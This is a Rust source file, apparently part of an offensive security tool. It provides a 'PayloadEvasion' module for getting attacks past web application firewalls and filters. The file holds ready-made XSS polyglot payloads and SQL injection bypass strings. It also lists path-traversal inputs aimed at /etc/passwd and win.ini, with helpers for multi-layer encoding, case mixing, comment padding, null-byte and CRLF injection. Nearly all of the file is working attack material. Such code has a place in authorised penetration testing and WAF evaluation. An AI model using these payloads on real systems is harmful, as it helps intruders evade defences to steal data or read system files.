/// Evasion techniques for bypassing WAFs and filters
use std::collections::HashMap;

pub struct PayloadEvasion;

impl PayloadEvasion {
    /// URL encode payload
    pub fn url_encode(payload: &str) -> String {
        urlencoding::encode(payload).to_string()
    }

    /// Double URL encode
    pub fn double_encode(payload: &str) -> String {
        let first = urlencoding::encode(payload);
        urlencoding::encode(&first).to_string()
    }

    /// Unicode encode
    pub fn unicode_encode(payload: &str) -> String {
        payload
            .chars()
            .map(|c| format!("\\u{:04x}", c as u32))
            .collect()
    }

    /// HTML entity encode
    pub fn html_encode(payload: &str) -> String {
        payload
            .chars()
            .map(|c| match c {
                '<' => "&lt;".to_string(),
                '>' => "&gt;".to_string(),
                '"' => "&quot;".to_string(),
                '\'' => "&#x27;".to_string(),
                '&' => "&amp;".to_string(),
                _ => format!("&#x{:x};", c as u32),
            })
            .collect()
    }

    /// Hex encode
    pub fn hex_encode(payload: &str) -> String {
        payload.chars().map(|c| format!("{:x}", c as u32)).collect()
    }

    /// Mixed case evasion (for bypassing case-sensitive filters)
    pub fn mixed_case(payload: &str) -> String {
        payload
            .chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_uppercase().to_string()
                } else {
                    c.to_lowercase().to_string()
                }
            })
            .collect()
    }

    /// Add random whitespace/tabs
    pub fn obfuscate_whitespace(payload: &str) -> String {
        payload
            .replace(" ", "/**/")
            .replace("=", "/**/=/**/")
    }

    /// SQL comment injection
    pub fn sql_comment_evasion(payload: &str) -> String {
        payload.replace(" ", "/**/")
    }

    /// Concatenation-based evasion for SQLi
    pub fn sql_concat_evasion(word: &str) -> Vec<String> {
        vec![
            // MySQL CONCAT
            format!("CONCAT('{}')", word.chars().map(|c| format!("CHAR({})", c as u8)).collect::<Vec<_>>().join(",")),
            // String concatenation
            word.chars().map(|c| format!("'{}'", c)).collect::<Vec<_>>().join("+"),
        ]
    }

    /// XSS polyglot payloads (work in multiple contexts)
    pub fn xss_polyglots() -> Vec<String> {
        vec![
            r#"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"#.to_string(),
            r#"'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'--></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">"#.to_string(),
            r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//"#.to_string(),
        ]
    }

    /// Generate multiple evasion variants of a payload
    pub fn generate_variants(payload: &str) -> Vec<String> {
        let mut variants = vec![payload.to_string()];

        variants.push(Self::url_encode(payload));
        variants.push(Self::double_encode(payload));
        variants.push(Self::mixed_case(payload));

        // SQL-specific
        if payload.contains("SELECT") || payload.contains("UNION") {
            variants.push(Self::sql_comment_evasion(payload));
            variants.push(Self::obfuscate_whitespace(payload));
        }

        variants
    }

    /// WAF bypass techniques database
    pub fn waf_bypasses() -> HashMap<&'static str, Vec<&'static str>> {
        let mut bypasses = HashMap::new();

        // SQL Injection WAF bypasses
        bypasses.insert("sqli", vec![
            "/*!50000SELECT*/ * FROM users",
            "SeLeCt * FrOm users",
            "SELECT/**/users/**/FROM/**/users",
            "SELECT(1)FROM(users)",
            "%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%75%73%65%72%73",
        ]);

        // XSS WAF bypasses
        bypasses.insert("xss", vec![
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        ]);

        // LFI WAF bypasses
        bypasses.insert("lfi", vec![
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "/var/www/../../etc/passwd",
        ]);

        bypasses
    }

    /// Null byte injection (for older systems)
    pub fn null_byte_inject(payload: &str) -> String {
        format!("{}%00.jpg", payload)
    }

    /// CRLF injection
    pub fn crlf_inject(payload: &str) -> String {
        format!("%0d%0a{}", payload)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_encode() {
        let payload = "' OR '1'='1";
        let encoded = PayloadEvasion::url_encode(payload);
        assert!(encoded.contains("%27"));
    }

    #[test]
    fn test_mixed_case() {
        let payload = "SELECT";
        let mixed = PayloadEvasion::mixed_case(payload);
        assert_eq!(mixed, "SeLeCt");
    }

    #[test]
    fn test_generate_variants() {
        let payload = "SELECT * FROM users";
        let variants = PayloadEvasion::generate_variants(payload);
        assert!(variants.len() > 1);
    }
}
